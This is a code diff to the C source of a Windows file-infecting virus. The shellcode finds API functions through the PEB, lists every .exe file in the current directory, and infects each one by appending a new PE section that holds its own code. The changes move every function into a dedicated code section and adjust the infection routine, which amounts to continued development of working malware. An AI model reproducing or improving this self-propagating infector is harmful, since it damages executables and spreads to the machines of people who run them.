@@ -99,6 +99,7 @@ typedef struct SHELL_CODE_SUPER_BLOCK {
 #include <string.h>
 #endif
 
+#pragma code_seg(".advance")
 __forceinline void noputs(const char *ptr) { return; } 
 #ifndef DEBUG
 #define puts noputs
@@ -137,6 +138,7 @@ typedef WORD *PIMAGE_EXPORT_ORDINAL_TABLE;
 
 //======================================================================
 
+#pragma code_seg(".advance")
 __forceinline int _strcmp(const char *s1, const char *s2) {
     while(*s1 || *s2) {
         if(*s1 != *s2) return *s1 < *s2 ? -1 : 1;
@@ -145,6 +147,7 @@ __forceinline int _strcmp(const char *s1, const char *s2) {
     return 0;
 }
 
+#pragma code_seg(".advance")
 __forceinline DWORD FindFunction(
         PCHAR pcFuncName,
         DWORD DemandModuleBase
@@ -195,6 +198,7 @@ __forceinline DWORD FindFunction(
     return 0;
 }
 
+#pragma code_seg(".advance")
 __forceinline DWORD FindBase(PWCHAR DemandModuleName, PEB *peb) {
     // Find ImageBase of kernel32.dll
     size_t DemandModuleNameLen = sizeof(DemandModuleName) / sizeof(WCHAR);  
@@ -238,6 +242,7 @@ __forceinline DWORD FindBase(PWCHAR DemandModuleName, PEB *peb) {
 
 //======================================================================
 
+#pragma code_seg(".advance")
 __forceinline int ReadOffset(SCSB *sb, HANDLE hFile, long offset, long mode, void* buf, long size) {
     if(SetFilePointer(hFile, offset, NULL, mode) == INVALID_SET_FILE_POINTER) {
         puts("Error when set file pointor!");
@@ -249,6 +254,7 @@ __forceinline int ReadOffset(SCSB *sb, HANDLE hFile, long offset, long mode, voi
     }
     return 0;
 }
+#pragma code_seg(".advance")
 __forceinline int WriteOffset(SCSB *sb, HANDLE hFile, long offset, long mode, void* buf, long size) {
     if(SetFilePointer(hFile, offset, NULL, mode) == INVALID_SET_FILE_POINTER) {
         puts("Error when set file pointor!");
@@ -260,6 +266,7 @@ __forceinline int WriteOffset(SCSB *sb, HANDLE hFile, long offset, long mode, vo
     }
     return 0;
 }
+#pragma code_seg(".advance")
 __forceinline int SetFileSize(SCSB *sb, HANDLE hFile, long size) {
     if(SetFilePointer(hFile, size, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
         puts("Error when set file pointor!");
@@ -274,6 +281,7 @@ __forceinline int SetFileSize(SCSB *sb, HANDLE hFile, long size) {
 
 //======================================================================
 
+#pragma code_seg(".advance")
 __forceinline HANDLE OpenTargetA(SCSB *sb, CHAR *name) {
     HANDLE hFile = CreateFileA(
         name,
@@ -285,7 +293,7 @@ __forceinline HANDLE OpenTargetA(SCSB *sb, CHAR *name) {
     );
     return hFile;
 }
-
+#pragma code_seg(".advance")
 __forceinline int InfectTarget(SCSB *sb, HANDLE hFile) {
     int err = 0;
 //----------------------------------------------------------------------
@@ -384,6 +392,7 @@ __forceinline int InfectTarget(SCSB *sb, HANDLE hFile) {
     // Set New Section Header
     char *sName = pNewSecHdr->Name;
     sName[0] = '.', sName[1] = 'e', sName[2] = 'x';
+    sName[3] = sName[4] = sName[5] = sName[6] = sName[7] = 0; /* Something not null when O2*/
     pNewSecHdr->Misc.VirtualSize = CODE_SIZE;
     pNewSecHdr->VirtualAddress = rvaNewSec;
     pNewSecHdr->SizeOfRawData = raw_size;
@@ -450,28 +459,8 @@ __forceinline int InfectTarget(SCSB *sb, HANDLE hFile) {
 
 //======================================================================
 
-__forceinline void ShellCodeMain(SCSB *sb) {
-    // find exe in cwd
-    CHAR search[6] = {'*', '.', 'e', 'x', 'e', 0};
-    WIN32_FIND_DATAA findData;
-    HANDLE hFind = FindFirstFileA(search, &findData);
-    if(hFind == INVALID_HANDLE_VALUE) return;
-    // iterate files
-    LPWIN32_FIND_DATAA lpFindData = &findData;
-    do {
-        puts(lpFindData->cFileName);
-        HANDLE hf = OpenTargetA(sb, lpFindData->cFileName);
-        if(hf == NULL) continue;
-        InfectTarget(sb, hf);
-        CloseHandle(hf);
-    } while(FindNextFileA(hFind, lpFindData));
-    FindClose(hFind);
-    return;
-}
-
-//======================================================================
-
-inline void GetAllFunc(PEB *peb, SCSB *sb) {
+#pragma code_seg(".advance")
+__forceinline void GetAllFunc(PEB *peb, SCSB *sb) {
     // Get Module Base
     WCHAR DemandModuleName[13] = {L'K', L'E', L'R', L'N', L'E', L'L',
         L'3', L'2', L'.', L'D', L'L', L'L', 0};
@@ -502,19 +491,42 @@ inline void GetAllFunc(PEB *peb, SCSB *sb) {
 
 //======================================================================
 
+#pragma code_seg(".advance")
+__forceinline void ShellCodeMain(SCSB *sb) {
+    // find exe in cwd
+    CHAR search[6] = {'*', '.', 'e', 'x', 'e', 0};
+    WIN32_FIND_DATAA findData;
+    HANDLE hFind = FindFirstFileA(search, &findData);
+    if(hFind == INVALID_HANDLE_VALUE) return;
+    // iterate files
+    LPWIN32_FIND_DATAA lpFindData = &findData;
+    do {
+        puts(lpFindData->cFileName);
+        HANDLE hf = OpenTargetA(sb, lpFindData->cFileName);
+        if(hf == NULL) continue;
+        InfectTarget(sb, hf);
+        CloseHandle(hf);
+    } while(FindNextFileA(hFind, lpFindData));
+    FindClose(hFind);
+    return;
+}
+
+//======================================================================
+
+#pragma code_seg(".advance")
 void ShellCode() {
 __code_start:
     SCSB super_block;
     SCSB *sb = &super_block;
     PPEB peb;
-    PBYTE imageBase;
+    DWORD imageBase;
     // get peb
     __asm {
         mov eax, fs:[30h];
         mov peb, eax
     }
     // get imageBase
-    imageBase = (PBYTE)*(DWORD*)(peb + 0x8);
+    imageBase = (DWORD)peb->Reserved3[1];
     // Get funtion pointer
     GetAllFunc(peb, sb);
     // Get Code info
@@ -534,6 +546,9 @@ __code_start:
     sb->_shellCode = codeAdr;
     sb->_CODE_SIZE = codeSize;
     sb->_JMP_POINT_OFFSET = jmpPoint;
+#ifdef DEBUG
+    printf("Codeinfo: %p %d %d\n", codeAdr, codeSize, jmpPoint);
+#endif
     // Start infecting
     ShellCodeMain(sb);
     // Return back
